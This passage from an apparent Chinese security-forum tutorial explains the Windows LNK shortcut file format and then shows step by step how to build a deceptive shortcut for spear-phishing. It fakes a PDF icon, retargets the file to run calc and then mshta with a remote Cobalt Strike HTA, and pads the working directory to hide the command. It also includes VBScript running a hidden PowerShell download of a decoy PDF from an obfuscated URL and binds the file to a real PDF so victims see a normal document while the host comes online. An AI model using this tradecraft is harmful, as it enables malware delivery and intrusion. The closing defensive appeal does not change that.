
![图片21 EXTRA_DATA](https://bbs.kanxue.com/upload/attach/202007/879321_EUWZWSTMWA6UBZZ.jpg)

示例文件中的`EXTRA_DATA`包含`SpecialFolderDataBlock`：

![图片22 SpecialFolderDataBlock](https://bbs.kanxue.com/upload/attach/202007/879321_XPB33SQPYDJJXDA.jpg)

- `BlockSize`(4 bytes)： 0x00000010
- `BlockSignature`(4 bytes)： 0xA000005，标识`SpecialFolderDataBlock`
- `SpecialFolderID` (4 bytes)：0x00000025，指定Folder ID
- `Offset`(4 bytes)：0x000000D5，偏移大小，指向IDList中第五个ItemID

`KnownFolderDataBlock`：

![图片23 KnownFolderDataBlock](https://bbs.kanxue.com/upload/attach/202007/879321_WSZGS8QV5BW2MWS.jpg)

- `BlockSize`(4 bytes)： 0x0000001C
- `BlockSignature`(4 bytes)： 0xA00000B，标识`KnownFolderDataBlock`
- `KnownFolderID`(16 bytes)：GUID
- `Offset`(4 bytes)：0x000000D5，偏移大小，指向IDList中第五个ItemID

`PropertyStoreDataBlock`：

![图片24 PropertyStoreDataBlock](https://bbs.kanxue.com/upload/attach/202007/879321_R4XA9VK48MT9ZDN.jpg)

- `BlockSize`(4 bytes)： 0x000001F4
- `BlockSignature`(4 bytes)： 0xA000009，标识`PropertyStoreDataBlock`
- `PropertryStore`(492 bytes)

`TrackerDataBlock`：

![图片25 PropertyStoreDataBlock](https://bbs.kanxue.com/upload/attach/202007/879321_JHNMFJ365HHTN74.jpg)

- `BlockSize`(4 bytes)： 0x00000060
- `BlockSignature`(4 bytes)： 0xA000003，标识`TrackerDataBlock`
- `Length`(4 bytes)：0x00000058，该数据块最小长度
- `Version`(4 bytes)：0x00000000
- `MachineID`(16 bytes)
- `Droid`(32 bytes)：2 GUID
- `DroidBirth`(32 byte)：2 GUID

## 0x02 构造迷惑性LNK文件

我们首先生成一个正常的LNK文件：

![图片26 正常LNK文件](https://bbs.kanxue.com/upload/attach/202007/879321_7W47UND7KW8DXT8.jpg)

之后更改其图标为`%SystemRoot%/System32/SHELL32.dll`中任意一个：

![图片27 修改图标](https://bbs.kanxue.com/upload/attach/202007/879321_GBF9VMQBK9T3YA8.jpg)

### 0x02.1 修改图标

用`010 Editor`打开该LNK文件，找到`String Data`部分`ICON_LOCATION`字符串：

![图片28 ICON_LOCATION](https://bbs.kanxue.com/upload/attach/202007/879321_NJP2KHVX9MASWKV.jpg)

我们要将其修改为`./1.pdf`(`Unicode`)，其长度`0x07`：

![图片29 修改图标](https://bbs.kanxue.com/upload/attach/202007/879321_SY5QWGXRFEX65VT.jpg)

其效果如下所示(左边机器打开`PDF`文件的默认程序是XODO PDF Reader，中间是Adobe Reader，右边是谷歌浏览器)：

![图片30 效果展示](https://bbs.kanxue.com/upload/attach/202007/879321_DPUSB4GFDRAEKDW.jpg)

其会根据目标机器上所安装的环境进行适配,以显示出符合本机环境的图标,加大了样本的成功几率

### 0x02.2 修改目标

原始目标如下所示：

![图片31 原始目标](https://bbs.kanxue.com/upload/attach/202007/879321_48M83N8W4P38C3Q.jpg)

现在我们修改`EnvironmentVariableDataBlock`中的`TargetAnsi`及`TargetUnicode`：

![图片32 修改TargetAnsi](https://bbs.kanxue.com/upload/attach/202007/879321_43MEHYA7F7328TY.jpg)

![图片33 修改TargetUnicode](https://bbs.kanxue.com/upload/attach/202007/879321_C577Z3BB55V7DAS.jpg)

将其修改为`%windir%/system32`目录不存在的一个EXE文件名。

效果展示：

![图片34 效果展示](https://bbs.kanxue.com/upload/attach/202007/879321_AWGNED9ZP95G4S5.jpg)

但这时双击该文件会报错：

![图片35 报错](https://bbs.kanxue.com/upload/attach/202007/879321_5RB88CG8XREYSPN.jpg)

所以我们需要再修改`LinkTargetIDList`中第五个`ItemID`：

![图片36 修改第五个ItemID](https://bbs.kanxue.com/upload/attach/202007/879321_NN3TNJSQ72R2AFC.jpg)

如此一来，打开该文件便会弹出计算器：

![图片37 弹出计算器](https://bbs.kanxue.com/upload/attach/202007/879321_QHRUZDRFGGEA9GX.jpg)

## 0x03 扩展

首先新建一指向`%windir%/System32/mshta.exe`的快捷方式(文件名尽量带有迷惑性)，并更改其图标为`%SystemRoot%/System32/SHELL32.dll`中任意一个：

![图片38 mshta](https://bbs.kanxue.com/upload/attach/202007/879321_DQS55WS5EAU4BN9.jpg)

之后更改其参数为`HTA`下载地址：

![图片39 文件下载](https://bbs.kanxue.com/upload/attach/202007/879321_HAZ4QTFGHHC3E9E.jpg)

注：笔者是使用`Cobalt Strike`生成`HTA`文件：

![](https://bbs.kanxue.com/upload/attach/202007/879321_T4AWEQ6B625BF6K.jpg)

于其执行`payload`前增加如下语句(**用于下载诱饵文档并且进行打开,同时诱饵文档的显示有多种方法,这里只是举一个例子**)：

```
Dim open_pdf

Set open_pdf = CreateObject("Wscript.Shell")

open_pdf.run "powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile('16aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0y4Q4x3X3f1J5y4#2)9K6b7e0R3H3z5o6m8Q4x3V1j5I4i4K6u0W2M7r3c8X3i4K6t1%4i4K6u0o6i4K6t1@1k6h3&6$3i4K6y4m8N6r3g2E0M7q4)9J5b7W2)9J5y4#2)9J5c8V1I4z5d9#2!0q4y4W2)9&6y4W2)9^5y4#2!0q4y4q4!0n7b7W2!0n7y4W2!0q4y4W2!0m8x3q4!0n7b7#2!0q4y4g2!0n7b7#2)9^5c8W2!0q4z5q4!0m8y4#2!0m8x3#2!0q4y4W2)9&6c8g2)9&6x3q4)9J5z5q4!0q4y4q4!0n7c8W2!0m8c8g2!0q4y4W2)9&6y4q4!0n7z5g2!0q4y4#2)9^5z5g2)9^5z5q4)9J5z5g2)9J5k6i4m8V1k6W2)9J5y4#2)9J5z5g2)9K6b7W2y4@1j5i4u0@1i4K6u0V1f1s2u0G2j5$3g2K6M7H3`.`. $env:temp'/LNK文件格式解析(修改版).pdf'", 0, true
```

这样一来，在受害者打开`LNK`文件后会从远程下载一正常`PDF`文档并打开。

接下来按照`0x02`部分所述方法修改即可，此处加一个Tip——在其`WORKING_DIR`字符串前面添加大量空格字符，使其目标长度超过`260`个字符：

![图片40 添加空格字符](https://bbs.kanxue.com/upload/attach/202007/879321_SCARVK6UBFXHR2C.jpg)

使用`copy /B`命令将其与正常`PDF`文档捆绑，使其文件大小看起来更具有说服力：

![图片41 文件大小](https://bbs.kanxue.com/upload/attach/202007/879321_5AKCGJHHPHWGWQX.jpg)

之后双击该`LNK`文件，主机便会上线，而受害者会看到一正常的`PDF`文档：

![图片42 主机上线](https://bbs.kanxue.com/upload/attach/202007/879321_UWVPXTKPDWGHFRV.jpg)

效果展示：

![图片43 效果](https://bbs.kanxue.com/upload/attach/202007/879321_JSK29FA83QT8DUA.jpg)

## 0x04 注意事项

文中只是以`pdf`为后缀做了一个例子,看官在具体进行构造的时候可以使用其他的后缀,只要是后面以`10 00 00 00`结尾即可

![图片44 不同后缀的情况](https://bbs.kanxue.com/upload/attach/202007/879321_PJT8B3PC5ZHA756.jpg)

当然看官也可以通过修改前面的规定数据大小的值以实现不拘泥于数字与字母的命名方式

如上图中的`docx`所示其数据大小为`9`,数据值为`.\11.docx`而下面的`png`所显示的数据大小为`7`,数据值为`.\1.png`。经过反复的修改测试可得知,只要其数据值能够符合其前面规定的数据块其就可以正常解析并且显示.

## 0x05 结语

本文属于抛砖引玉,其所使用的技术也不是很新颖.但的确可以在一定程度上起到迷惑的作用,故本绝影小组认为值得分享,同时鉴于有不少的`APT`组织(例如`Gamaredon`,`Oceanlotus`,`SideWinder`等)也同样进行`lnk`载荷的投递,希望各单位可以培养针对相关鱼叉载荷的安全意识,以减少损失.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
